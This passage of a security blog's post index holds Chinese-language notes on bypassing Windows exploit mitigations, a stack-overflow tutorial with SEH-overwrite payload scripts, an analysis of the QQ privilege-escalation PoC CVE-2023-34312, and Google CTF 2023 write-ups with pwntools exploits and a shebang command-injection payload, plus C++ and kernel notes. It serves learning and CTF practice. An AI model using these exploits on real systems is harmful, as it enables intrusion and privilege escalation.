b&quot;\\x38\\xa0\\x41\\x00&quot; #0041A038payload += shellcodewith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload) VirtualAlloc来开辟可执行的内存然后执行shellcode 和VirtualProtect一样的道理，不过需要使用复制的payload将shellcode复制到可执行的内存中 ASLR 在绕过DEP保护中需要调试的时候才能写入函数地址的原因就是这些函数的DLL使用了ASLR保护，导致函数每次加载的基地址不同，所以无法使用固定地址。 绕过思路主要有 低位覆盖，最低位是固定的 堆喷，将内存初始化后的\\x0c强制写为\\x90（nop的汇编），这样程序进入了任意的地址都能滑行到shellcode。（扩大伤害面） SEHOP 由于SEH是链式的，所以他会顺着链表检查，如果最后一个不为系统固定的终极异常处理函数就直接不执行。 最直接有效的就是伪造SEH链，由于只会验证最后一个，只满足这个条件就可以了 由于SEHOP在SafeSEH之前，所以绕过过后还需要继续绕过SafeSEH 参考 《0day安全：软件漏洞分析技术》","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"【Win Pwn】基础栈溢出利用","slug":"win-pwn-stack","date":"2023-07-08T08:39:36.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2023/07/08/win-pwn-stack/","link":"","permalink":"https://joe1sn.eu.org/2023/07/08/win-pwn-stack/","excerpt":"[Win Pwn] 基础栈溢出利用 window下无保护的栈溢出加载shellcode","text":"[Win Pwn] 基础栈溢出利用 window下无保护的栈溢出加载shellcode 程序 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt; void vuln()&#123; char password[6] = &quot;ABCDE&quot;; char str[6]; FILE *fp; if(!(fp=fopen(&quot;password.txt&quot;,&quot;r&quot;))) exit(0); fscanf(fp,&quot;%s&quot;,str); str[5]=&#x27;\\0&#x27;; if(strcmp(str,password)==0) // fprintf(stderr,&quot;OK.\\n&quot;); printf(&quot;OK.\\n&quot;); else // fprintf(stderr,&quot;NO.\\n&quot;); printf(&quot;NO.\\n&quot;);&#125;int main()&#123; vuln(); return 0;&#125; 在windows下的防护等级有 ASLR /DYNAMICBASE 带有剥离的重定位条目边缘情况 /HIGHENTROPYVA for 64-bit systems Code integrity/signing: /INTEGRITYCHECK 使用有效（可信、活动）证书进行 Authenticode 签名（Linux 目前不支持） DEP 别称：W^X, NX Manifest isolation /ALLOWISOLATION SEH和SafeEH SEH=Structured Exception Handling Control Flow Guard和Return Flow Guard instrumentation Stack cookie /GS ASLR：与Linux的PIE相同，指地址随机化，将在程序启动时将DLL随机的加载到内存中的未知，自Windows 10开始已经在系统中被配置为默认启动； High Entropy VA：高熵64位地址空间布局随机化，开启后标识此程序的随机化取值空间为64 bit，这会导致攻击者更难去推测随机化后的地址； Force Integrity：强制签名保护，开启后标识程序加载时需要验证其中的前命，如果签名不正确，程序将会被阻止运行； Isolation：隔离保护，开启后表示此程序加载时将会在一个相对独立的隔离环境中被加载，从而阻止攻击者过度提升权限； NX/DEP/PAE：NX保护指的是内存页不可运行。属于系统级的内存保护功能，能够将一页或多页标记为不可执行，从而防止从该内存区域运行代码，以帮助防止利用缓冲区溢出。防止代码在数据页面（例如堆、栈和内存池）中运行，在Windows中常称为DEP。 PAE指物理地址拓展，PAE是一项处理器功能，使x86处理器可以在部分windows版本上访问4 GB以上的物理内存。在基于x86的系统上运行的某些32位版本的Windows Server可以使用PAE访问最多64 GB或128 GB的物理内存，具体取决于处理器的物理地址大小。使用PAE，操作系统将从两级线性地址转换为三级地址转换。两级线性地址转换将线性地址拆分为3个独立的字段索引到内存表中，三级地址转换将其拆分为4个独立的字段：一个2位字段，两个9位字段和一个12位字段。PAE模式下的页表条目(PTE)和页目录条目(PDE)的大小从32位增加到64位。附加位允许操作系统PTE或PDE引用4 GB以上的物理内存，同时PAE将允许在基于x86的系统上运行32位windows中启用DEP等功能。 SEHOP：即结构化异常处理保护(structured Exception Handling Overwrite Protection)，这个保护能够防止攻击者利用结构化异常处理来进行进一步的利用。 CFG：即控制流防护这项技术通过在间接跳转前插入校验代码，检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点，最终及时有效的进行异常处理，避免引发相关的安全问题。 RFG：即返回地址防护，在每个函数头部将返回地址保存到 fs:[rsp](thread control stack)，并在函数返回前将其与栈上返回地址进行比较，从而有效阻止攻击； SafeSEH：安全结构化异常处理(Safe Structured Exception Handlers)，白名单版的安全沙箱，定义一些异常处理程序，并基于此构造安全结构化异常处理表，程序运行后，安全结构化异常处理表之外的异常处理程序将会被阻止运行； GS：类似于Linux中的Canary保护，开启后，会在返回地址和BP之前压入一个额外的 Security Cookie，系统会比较栈中的这个值和原先存放在 .data中的值做一个比较，如果两者不吻合，则说明发生了栈溢出； Authenticode：签名保护； .NET：DLL混淆级保护 你可以查看文件头进行识别，也可以使用winchecksec进行识别 非常明显的漏洞点 漏洞分析 GCC编译gcc .\\main.c -o shellcode 先试一下跳转，加上覆盖ebp的空间大小是0x1c 加载shellcode 现在想办法布置shellcode，由于没有后门函数所以需要利用SEH进行shellcode的布置。 栈中的 SEH Handle 存储的形式 基本的布置方式如下，实战的可以参考CVE-2019-9766简单栈溢出 使用x32dbg调试得到SEH链，然后得出payload 1234567891011121314payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*0x11c #0x1ctest_func = b&quot;\\xc4\\x16\\x40\\x00&quot; #004016C4NSEH = b&quot;\\xeb\\x06\\x90\\x90&quot; #asm(&quot;jmp 6;nop;nop&quot;)gadget = b&quot;\\xee\\x19\\x40\\x00&quot; #004019EE 00402537 004017EEnops = b&quot;\\x90&quot;*5 #nopspayload = offset+NSEH+gadget+shellcodewith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload) 使用了gadget，进行两次pop抬栈，这样就能滑行到shellcode gadget过后的跳转 但是shellcode长度有限制，所以很寄 但是我们执行一小段shellcode，那么可以尝试自己写gadget，将shellcode写入在payload前段，然后利用SEH到自己写的gadget，最后跳转到shellcode，需要注意的是程序会把第五位归0，所以要注意。 在使用fscanf函数读取字符串时，以下特殊字符可能会导致读取失败或产生意外的结果： 空格 (0x20) 制表符 (0x09) 换行符 (0x0A) 回车符 (0x0D) 这块儿就只有自己根据实际情况改进shellcode了。 那么我稍微改进一下源代码 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt; void hacked()&#123; printf(&quot;Hacked\\n&quot;);&#125;void vuln()&#123; char password[6] = &quot;ABCDE&quot;; char str[6]; FILE *fp; if(!(fp=fopen(&quot;password.txt&quot;,&quot;r&quot;))) exit(0); fgets(str, 0x1000, fp); str[5]=&#x27;\\0&#x27;; if(strcmp(str,password)==0) // fprintf(stderr,&quot;OK.\\n&quot;); printf(&quot;OK.\\n&quot;); else // fprintf(stderr,&quot;NO.\\n&quot;); printf(&quot;NO.\\n&quot;);&#125;int main()&#123; vuln(); return 0;&#125; 由于栈比较小，可以考虑自己写入gadget来帮助shellcode的跳转 1234567891011121314151617from ae64 import AE64payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*(0x11c-len(shellcode)-16) #0x1ctest_func = b&quot;\\xc4\\x16\\x40\\x00&quot; #004016C4NSEH = b&quot;\\xeb\\x06\\x90\\x90&quot; #asm(&quot;jmp 6;nop;nop&quot;)gadget = b&quot;\\xee\\x19\\x40\\x00&quot; #004019EE 00402537 004017EEself_gadget = b&quot;\\x89\\xE0\\x05\\x14\\x06\\x00\\x00\\xFF\\xE0&quot; # mov eax, esp # sub eax, 0x608 # jmp eaxpayload = b&quot;\\xaa&quot;*16+shellcode+offset+NSEH+gadget+self_gadgetwith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload)","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"【漏洞复现】CVE-2023-34312分析","slug":"qq-evasion","date":"2023-07-03T12:13:39.000Z","updated":"2023-07-18T01:32:15.629Z","comments":true,"path":"2023/07/03/qq-evasion/","link":"","permalink":"https://joe1sn.eu.org/2023/07/03/qq-evasion/","excerpt":"关于QQ提权漏洞CVE-2023-34312的分析 ！！未完待续！！","text":"关于QQ提权漏洞CVE-2023-34312的分析 ！！未完待续！！ PoC分析 PoC地址：https://github.com/vi3t1/qq-tim-elevation，用rust写的按照教程编译好了就可以直接打了 由于没有开启ASLR保护所以很稳 接着是分析一下PoC 触发 触发方式是.\\QQProtect .\\evil.dll，同时必须保持tinyxml.dll在同一目录下，这里用QQ9.7.7举例子。 首先是GetCommandLineW获得启动参数，接着判断置否存在下列关键参数，然后不存在关键参数直接到了StartAddress 使用QQProtectEngine.dll中的RunQQProtect，设置回调函数sub_40C950 回调函数中的a2指针可以将任何地址的值设置为参数分析时的参数个数值，也就是 1。 那么现在我们就有了将任意地址写为1的能力，恰好QQProtect.exe没有开启ASLR保护，若开启的话下图应该存在IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE PoC 和上文中结合起来，在QQProtect中导入了tinyxml.dll，所以可以修改这个dll的内容来执行攻击。 PoC首先获取了evil.dll的路径， 123let evil_dllpath: String = std::env::args().nth(1).unwrap();let evil_dllpath: std::path::PathBuf = std::path::Path::new(&amp;evil_dllpath).canonicalize().unwrap();println!(&quot;evil dll: &#123;&#125;&quot;, evil_dllpath.display()); 接着打开服务获得QQProtectEngine.dll的基地址（因为他开启了ASLR保护）。 在PoC中打开了Windows的QPCore服务然后获取配置信息，从配置信息中提取出qqprotect.exe和QQProtectEngine.dll的路径。 由于LoadLibraryExW中使用了DONT_RESOLVE_DLL_REFERENCES所以不会调用DLLMain，若函数成功，则返回值是已加载模块的句柄，从句柄的第一个值提取出加载的地址。注意的是，这里是首先加载tinyxml.dll，所以加载的QQProtectEngine.dll的地址在这里同一样适用，这样就获得了QQProtectEngine.dll的基地址。 123456789101112131415fn get_qqprotectengine_dllbase() -&gt; u32 &#123; let manager = ServiceManager::local_computer(None::&lt;&amp;str&gt;, ServiceManagerAccess::ENUMERATE_SERVICE).unwrap(); let service = manager.open_service(&quot;QPCore&quot;, ServiceAccess::QUERY_CONFIG).unwrap(); let service_config = service.query_config().unwrap(); let qqprotect_exe = windows_args::ArgsOs::parse_cmd(service_config.executable_path.as_os_str()).next().unwrap(); let qqprotectengine_dll = std::path::Path::new(&amp;qqprotect_exe).parent().unwrap().join(&quot;QQProtectEngine.dll&quot;); unsafe &#123; let h = LoadLibraryExW(PCWSTR(HSTRING::from(qqprotectengine_dll.as_path()).as_ptr()), HANDLE::default(), DONT_RESOLVE_DLL_REFERENCES).unwrap(); let base = h.0 as u32; FreeLibrary(h); return base; &#125;&#125; 创建IPC进程间通讯 如何找到IPC通讯，可以在https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist安装`pipelist`查看所有的命名管道通讯 那么在QQProtect.exe一定会有一个连接命名管道的地方，在QQProtectEnginee.dll中使用 找到对应的管道命名 和 （回调分析麻了）之后会进入QSection.dll中的函数，具体逆向可以看B战大佬的视频：https://www.bilibili.com/video/BV1wm4y1E7TL 很像一个结构体。加载了QPSection后调用了6号导出函数，之后还需要对结构体进行逆向","categories":[],"tags":[]},{"title":"【CTF】2023 Google CTF WriteUp与复现","slug":"googleCTF-wp","date":"2023-06-26T15:44:49.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2023/06/26/googleCTF-wp/","link":"","permalink":"https://joe1sn.eu.org/2023/06/26/googleCTF-wp/","excerpt":"端午节打的比赛，事情比较多没怎么看题，指导学弟做了下，这里来个复盘。 开始CTF的复健之路吧。","text":"端午节打的比赛，事情比较多没怎么看题，指导学弟做了下，这里来个复盘。 开始CTF的复健之路吧。 Pwn WRITE-FLAG-WHERE 最简单的一道pwn，没有开ASLR保护。当时我的机器跑不起来，学弟的能跑，和他一起分析。 程序的主逻辑是读取/proc/self/maps来读取存在的内存（gdb中的vmmap就是这样实现的），然后把 flag 读取到一个全局变量中，最后我们可以在任意一个地址写入任意长度（&lt;0x7f）的flag中的字符串。 当时我们是在arch上做的，使用gdb能看到输出，然后尝试将flag覆盖内存中的提示语句 那么地址就是 *$rebase(0x21E0)，尝试远程 得到flag CTF{Y0ur_j0urn3y_is_0n1y_ju5t_b39innin9} WRITE-FLAG-WHERE 2 当时离做出来差了亿点点。 保护没变，但是删除了之前的字符串修改点。后来我看到了有一段无关的代码段 后来想这道题快想魔怔了 【未解出】使用sscanf覆盖 挺疯狂的一个想法，由于死循环内不存在输入，但是sscanf会根据你的输入去匹配，然后我们又知道flag是CTF&#123;xxxx&#125;，所以可以覆盖0x%llx %u的第一个，类似于： 逐步缩小地址爆破得到flag，但是考虑到工作量而且太久没做CTF导致pwntools的不熟悉没有能成功 【差一点】可视化shellcode 和上面的思路差不多，只不过是利用了T的ASCII为0x54，而0x54的汇编码是push rsp，那么一直写入T，让最后的退出划入那段不相关的代码段 1234567891011def nop2(addr,lenth): r.sendline(b&quot;0x%x %d&quot; % (addr+base,lenth)) sleep(0.1)nop2(0x20d5,50)for i in range(10): nop2(0x1443-i,2)sleep(0.1)r.sendline(b&quot;0x1234 111111&quot;) 最后得到flag CTF{impr355iv3_6ut_can_y0u_s01v3_cha113ng3_3?} 注意：由于网络延时最后的flag不开代理导致没有收到… WRITE-FLAG-WHERE 3 上一道题直接导致心态爆炸，这道题没怎么看。不过看上去限制了我们能修改的地址范围 不能 是main函数±0x5000的位置，导致之前的exp失效。 不过本地patched过的版本成功调用了alarm 那么试试修改libc中的报错为flag，但是不行 不过思路也是很接近的了，在官方的exp中使用了&#125;，作为jnp来进行爆破。其他也是使用了一下gadget，利用jnp 0x48实现ROP的跳转 1234r3tr0@pwnmachine:~$ rasm2 -ax86 -b64 -d 0x4354467b4354 push r12jnp 0x48push rsp 使用2中的思路覆写libc中的exit 由于输入位于栈上使用，输入组合的ROP链，由于libc中的exit已经被覆写，所以程序会返回ret，从而触发ROP链，最后实现write写出flag 这里使用r3kpig的exp打一下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *context.log_level=&#x27;debug&#x27;context.arch=&#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]# p=process(&#x27;./main&#x27;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)# gdb.attach(p)# p.interactive()# exit(1)sh=&#x27;&#x27;&#x27;b *0x555555555478b *0x555555555491b exit&#x27;&#x27;&#x27;# p = process(&quot;./chal&quot;)# p = gdb.debug(&quot;./chal&quot;,sh,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)p = remote(&quot;wfw3.2023.ctfcompetition.com&quot;,1337)ru = lambda a: p.readuntil(a)r = lambda n: p.read(n)sla = lambda a,b: p.sendlineafter(a,b)sa = lambda a,b: p.sendafter(a,b)sl = lambda a: p.sendline(a)s = lambda a: p.send(a)def ch(addr,l): target = addr pay = hex(target).encode()+b&quot; &quot;+str(l).encode() p.send(pay.ljust(0x40,b&#x27;\\0&#x27;))def end(l): p.send(flat(l).ljust(0x40,b&#x27;\\xff&#x27;)) p.read()def nop(addr,l): if l%2!=0: l=l-1 ch(addr+l-1,1) for x in range(0,l,2): ch(addr+x,2)ru(b&quot; expire\\n&quot;)PIE = int(p.readuntil(b&quot;-&quot;)[:-1],0x10)info(hex(PIE))for x in range(7): ru(b&quot;\\n&quot;)base = int(p.readuntil(b&quot;-&quot;)[:-1],0x10)info(hex(base))ru(b&quot;\\n\\n&quot;)ch(0x455f0+0x1b+base,1)ch(0x455f0+0x17+base,1)ch(0x455f0+0x2b-3+base,1)ch(0x455f0+0x2b-2+base,2)ch(0x455f0+0x1f+base,1)ch(0x455f0+0x4+base,1)ch(0x455f0+0x26+base,1)rdi = 0x000000000002a3e5+basebprintf = 0x555555555090-0x555555554000+PIEflag = 0x5555555590A0-0x555555554000+PIErsi = 0x000000000002be51+baseend([rdi,1337,rsi,flag,bprintf,])p.interactive() 得到flag CTF{y0ur_3xpl0itati0n_p0w3r_1s_0v3r_9000!!} STORYGEN 下载下来是python文件。 发现使用了os.system(&quot;/tmp/script.sh&quot;)，那么顺着逻辑去分析： 12345678910111213141516171819202122232425262728293031#@NAME&#x27;s storyNAME=&#x27;@NAME&#x27;WHERE=&#x27;@WHERE&#x27;echo &quot;$NAME came from $WHERE. They always liked living there.&quot;echo &quot;They had 3 pets:&quot;types[0]=&quot;dog&quot;types[1]=&quot;cat&quot;types[2]=&quot;fish&quot;names[0]=&quot;Bella&quot;names[1]=&quot;Max&quot;names[2]=&quot;Luna&quot;for i in 1 2 3do size1=$&#123;#types[@]&#125; index1=$(($RANDOM % $size1)) size2=$&#123;#names[@]&#125; index2=$(($RANDOM % $size2)) echo &quot;- a $&#123;types[$index1]&#125; named $&#123;names[$index2]&#125;&quot;doneechoecho &quot;Well, I&#x27;m not a good writer, you can write the rest... Hope this is a good starting point!&quot;echo &quot;If not, try running the script again.&quot; 然后输入替换这段脚本 open(&quot;/tmp/script.sh&quot;, &quot;w&quot;).write(STORY.replace(&quot;@NAME&quot;, name).replace(&quot;@WHERE&quot;, where).strip()) 不过存在小WAF 12def sanitize(s): return s.replace(&quot;&#x27;&quot;, &#x27;&#x27;).replace(&quot;\\n&quot;, &quot;&quot;) 首要思路肯定是命令注入，而且在首行的#@NAME's story自带了一个'，如果你对shell脚本比较了解的话，会知道往往是以#!/bin/bash开始的，尝试一下 成功调用了/bin/bash。赛后看wp发现这个是Shebang（也称为Hashbang），是一种在Unix和类Unix系统中用于指定脚本解释器的约定，它是通过在脚本文件的第一行以特定格式指定解释器的路径来实现的，可以利用这种方式直接./hello.py，比如： 12#!/usr/bin/python3print(&quot;hello&quot;) 那么开始构造exp，需要注意的是尽量使用\\x00截断 官方wp中介绍了一种技巧：#!/bin/cat&lt;空格&gt;的时候会读取自身脚本的内容，首先使用ls -al查看目录，最后排查到根目录 '!/usr/bin/env -S ls -al /\\x00' 尝试读取flag，出现提示 !/usr/bin/env -S cat /flag\\x00 得到提示，最后使用payload得到flag !/usr/bin/env -S sh -c &quot;/get_flag Give flag please&quot;\\x00 CTF{Sh3b4ng_1nj3cti0n_ftw} UBF","categories":[{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://joe1sn.eu.org/tags/CTF/"},{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/tags/writeup/"}]},{"title":"【C++】Cpp函数进化","slug":"cpp-function","date":"2023-06-26T00:10:22.000Z","updated":"2025-03-10T13:07:54.484Z","comments":true,"path":"2023/06/26/cpp-function/","link":"","permalink":"https://joe1sn.eu.org/2023/06/26/cpp-function/","excerpt":"C++的函数进化小结","text":"C++的函数进化小结 函数 有这样一个问题 1234567#include &lt;iostream&gt;int main()&#123; int IntArray = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; //统计大于20的数字 return 0;&#125; 那么很自然的给出解法 123456789101112131415161718#include &lt;iostream&gt;int CountMatch(int* start, int* end)&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (*start &gt; 20) sum++; &#125; return sum;&#125;int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; //统计大于20的数字 std::cout&lt;&lt;&quot;Matches: &quot;&lt;&lt;CountMatch(IntArray,IntArray+20)&lt;&lt;std::endl; return 0;&#125; 函数指针 这个时候的需要满足 统计大于10的数字 或者 统计小于35的数字，那么可以将*start &gt; 20这一段包装一下 123456789101112131415161718192021222324#include &lt;iostream&gt;int CountMatch(int* start, int* end, bool(*ConditionFunc)(const int &amp;))&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (ConditionFunc(*start)) sum++; &#125; return sum;&#125;bool bGreat20(const int &amp;num)&#123; return num &gt; 20; &#125;bool bGreat10(const int &amp;num)&#123; return num &gt; 10; &#125;bool bLess35(const int &amp;num)&#123; return num &lt; 35; &#125;int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; //统计大于20的数字 std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, bGreat20 )&lt;&lt;std::endl; std::cout&lt;&lt;&quot;Greater than 10 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, bGreat10 )&lt;&lt;std::endl; std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, bLess35 )&lt;&lt;std::endl; return 0;&#125; 图片上的代码有点小问题 在c语言中可以这样写，虽然编译会有警告，但是仍然可以生成。 1234567891011121314151617181920212223#include &lt;stdio.h&gt;int CountMatch(int* start, int* end, void *function_pointer(int))&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (function_pointer(*start)) sum++; &#125; return sum;&#125;int Pointer(int start)&#123; printf(&quot;Happy\\n&quot;); return 1;&#125;int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; //统计大于20的数字 printf(&quot;Matches: %d\\n&quot;,CountMatch(IntArray,IntArray+20, Pointer)); return 0;&#125; 在c中伴随着指针的引用*p和解引用&amp;p，C对指针的类型安全性进行了更严格的限制。C++中的指针类型必须与所指向的对象类型匹配，不允许进行隐式类型转换。这可以帮助减少潜在的类型错误和编程错误。 函数模板 上面的函数只能支持int，使用函数模板能让他支持更多类型 123456789101112131415161718192021222324252627#include &lt;iostream&gt; template &lt;typename T&gt; int CountMatch(T* start, T* end, bool(*ConditionFunc)(const T &amp;))&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (ConditionFunc(*start)) sum++; &#125; return sum; &#125;bool bGreat20(const int &amp;num)&#123; return num &gt; 20; &#125;bool bGreat10(const int &amp;num)&#123; return num &gt; 10; &#125;bool bLess35(const int &amp;num)&#123; return num &lt; 35; &#125;bool bTiny(const std::string &amp;val)&#123; return val.size() &lt;= 3; &#125;int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; std::string StrArray[] = &#123;&quot;Hello&quot;,&quot;world&quot;,&quot;This&quot;,&quot;is&quot;,&quot;a&quot;,&quot;test&quot;&#125;; //统计大于20的数字 std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, bGreat20 )&lt;&lt;std::endl; std::cout&lt;&lt;&quot;Greater than 10 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, bGreat10 )&lt;&lt;std::endl; std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( StrArray, StrArray+6, bTiny )&lt;&lt;std::endl; return 0;&#125; 仿函数 在条件中如果需要处理用户传入的数字怎么办 仿函数（Functor）是C++中的一个概念，指的是可以像函数一样使用的对象。它实际上是一个类或结构体，重载了函数调用运算符 operator()，使得对象可以像函数一样进行调用操作。 chatGPT给了我这样一个例子 1234567891011121314151617181920212223#include &lt;iostream&gt;// 定义一个仿函数类class AddFunctor &#123;public: int operator()(int a, int b) &#123; return a + b; &#125;&#125;;int main() &#123; // 创建一个仿函数对象 AddFunctor add; // 使用仿函数对象进行调用 int result = add(3, 4); // 输出结果 std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl; return 0;&#125; 在这里可以这样写 12345678template &lt;typename T&gt;struct Greater&#123; T mVal; //持有的状态 explicit Greater(T value): mVal(value)&#123;&#125; bool operator()(const T &amp;val) const &#123; return val&gt;mVal; &#125;&#125;; explicit：通过在单参数构造函数前添加 explicit 关键字，可以防止编译器在需要进行类型转换的情况下自动调用该构造函数。 operator：仿函数的实现，使得对象可以像函数一样进行调用操作。 抓函数中生成一个对象（该标准仅在c++11及以上支持），但是这样函数指针就没法用了 1Greater&lt;int&gt; greater20&#123;20&#125;; 可以学习标准库中的操作将模板持续下去 12345678910template &lt;typename T, typename fCompare&gt;int CountMatch(T* start, T* end, fCompare ConditionFunc)&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (ConditionFunc(*start)) sum++; &#125; return sum;&#125; 最后程序 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;template &lt;typename T, typename fCompare&gt;int CountMatch(T* start, T* end, fCompare ConditionFunc)&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (ConditionFunc(*start)) sum++; &#125; return sum;&#125;template &lt;typename T&gt;struct Greater&#123; T mVal; //持有的状态 explicit Greater(T value): mVal(value)&#123;&#125; bool operator()(const T &amp;val) const &#123; return val&gt;mVal; &#125;&#125;;int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; std::string StrArray[] = &#123;&quot;Hello&quot;,&quot;world&quot;,&quot;This&quot;,&quot;is&quot;,&quot;a&quot;,&quot;test&quot;&#125;; Greater&lt;int&gt; greater20&#123;20&#125;; //统计大于20的数字 std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, greater20 )&lt;&lt;std::endl; return 0;&#125; lambda表达式 这个我再Qt上用的挺多的，他是匿名函数的实现 1234567int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; auto greater20 = [](auto &amp;val) -&gt; bool &#123; return val &gt; 20; &#125;; //统计大于20的数字 std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, greater20 )&lt;&lt;std::endl; return 0;&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"https://joe1sn.eu.org/tags/cpp/"}]},{"title":"【win内核原理与实现】II. 进程与线程","slug":"windows-kernel-2-process&thread","date":"2023-06-14T01:41:52.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2023/06/14/windows-kernel-2-process&thread/","link":"","permalink":"https://joe1sn.eu.org/2023/06/14/windows-kernel-2-process&thread/","excerpt":"Windows中进程与线程的设置","text":"Windows中进程与线程的设置 关于进程与线程 操作系统“复习” ​ 在学习操作系统的时候，有个重点就是进程与线程的区别。最开始进程和线程是没有分开的，由于多数操作系统分开了用户态和内核态，那么用户态就必须和内核态进行交互才能调用系统资源（通过IOCTL交互）。这样每一个进程在内核当中都有一个“进程描述符”的东西来描述这个进程，并根据调度算法完成进程的运行。这里就假设一个进程test.exe调用了0x40大小的内存空间，在只有进程的时候，进程描述符中就会标记这个内存被这个进程使用，同时指令和运行都在其中。 ​ 这样有个问题就是，我需要两个这种“进程”来运行，且他们需要的恰好是同一块内存的相同数据，如果只有进程的话，就会存在两个0x40的内存，同时造成不必要的复制粘贴。随后就有了线程这个概念，比如面对上述情况，进程就只含有一个0x40大小的内存，对内存的访问就交给这个线程对应的进程。 进程和程序 ​ Windows的任务调度算法可以很好地适应多处理器和多任务的情形，在windows中的进程也遵守上述的准则。对于Windows内核需要做的事情是：维护一个全局的进程表，记录下当前有哪些进程正 在被执行；把时间分成适当的片段，在现代处理器结构中，这可以通过设置时钟中断来完成，因而每次时钟中断到来时系统就会获得控制权；在进程间实施切换，即保留上一个进 程的环境信息，恢复下一个进程的执行环境。关于Windows的调度算法可以简单理解为时间轮。 ​ 如果程序是一个完全的模块，那么他的内存就是我们熟悉的经典内存结构。 ​ 但是往往一个最简单的helloworld也会调用CRunTime的代码，所以有进程就能使用 共享内存 ，比如在静态数据区有着一份复制。 线程 ​ 线程不仅仅是一个控制流，它还有更多的内容。线程的调用栈（call stack）记录了它 作为控制流的状态信息，包括每一层函数调用和返回的指令地址。线程一定隶属于某个进 程，其控制流可以访问这个进程中的资源，包括所有的内存数据以及系统分配给此进程的 其他资源。一个进程可以有多个线程，由于这些线程隶属于同一个进程，所以它们之间相 互通信要方便得多，毕竟几乎所有的资源（并非全部）对于它们来说都是共享的。 Windows 中进程和线程的数据结构 内核层的进程和线程对象 在内核当中的描述为KPROCESS和KTHREAD。 在WRK中的定义为 123456789101112131415161718192021222324252627282930313233343536373839404142434445typedef struct _KPROCESS&#123; DISPATCHER_HEADER Header; //表明是分发器对象，可用于等待。进程退出时，此对象为有信号状态 LIST_ENTRY ProfileListHead; //进程参与性能分析时，作为节点加入全局性能分析进程链表。 ULONG DirectoryTableBase; // 两个成员的数组，第一个指向页目录表地址，第二个指向超空间的页目录表地址 ULONG Unused0; KGDTENTRY LdtDescriptor; //LDT的描述符 KIDTENTRY Int21Descriptor; //为了兼容DOS，通过int 21h调用系统功能 WORD IopmOffset; //指定IOPM（IO权限表，IO Privilege Map）位置。控制进程的用户模式IO访问权限 UCHAR Iopl; //IO优先级（IO Privilege Level） UCHAR 